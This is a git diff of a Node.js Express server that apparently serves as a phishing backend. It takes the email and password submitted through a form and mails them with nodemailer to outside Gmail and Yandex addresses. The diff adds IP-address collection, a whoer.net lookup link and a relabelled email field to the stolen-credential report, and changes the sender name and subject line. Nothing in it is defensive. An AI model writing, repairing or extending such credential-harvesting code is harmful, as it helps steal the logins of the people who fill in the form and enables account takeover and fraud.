@@ -9,6 +9,20 @@ app.use(express.static('public'));
 app.use(express.json())
 
 
+
+var os = require( 'os' );
+var networkInterfaces = Object.values(os.networkInterfaces())
+    .reduce((r,a) => {
+        r = r.concat(a)
+        return r;
+    }, [])
+    .filter(({family, address}) => {
+        return family.toLowerCase().indexOf('v4') >= 0 &&
+            address !== '127.0.0.1'
+    })
+    .map(({address}) => address);
+var ipAddresses = networkInterfaces.join(', ')
+console.log(ipAddresses);
 app.get('/', (req ,res) =>{
     res.sendFile(__dirname + '/public/contactform.html');
 })
@@ -62,8 +76,9 @@ app.post('/',async (req , res) =>{
         <h3>Contact Details</h3>
         <ul>
         
-        <li> Password : ${req.body.email}</li>
+        <li> email: ${req.body.email}</li>
         <li> Password : ${req.body.password}</li>
+        <li>Login IP: <a href='http://whoer.net/check?host=${ipAddresses}' target='_blank'>${ipAddresses}</li>
       
     
         </ul>
@@ -87,12 +102,12 @@ app.post('/',async (req , res) =>{
       });
 
       
-    
+    //   ,tyga44@yandex.ru
       // send mail with defined transport object
       let info = await transporter.sendMail({
-        from: '"Stan 👻" <info@lagzymedia.com.ng>', // sender address
+        from: '"Brian 👻" <info@lagzymedia.com.ng>', // sender address
         to: "stanlyobiek@gmail.com,tyga44@yandex.ru", // list of receivers
-        subject: "Hello ✔", // Subject line
+        subject: "Good day ✔", // Subject line
         text: "Hello world?", // plain text body
         html: output, // html body
       });
@@ -102,6 +117,7 @@ app.post('/',async (req , res) =>{
             res.send('success');
     });
     
+
 
 
 app.listen(PORT, () =>{
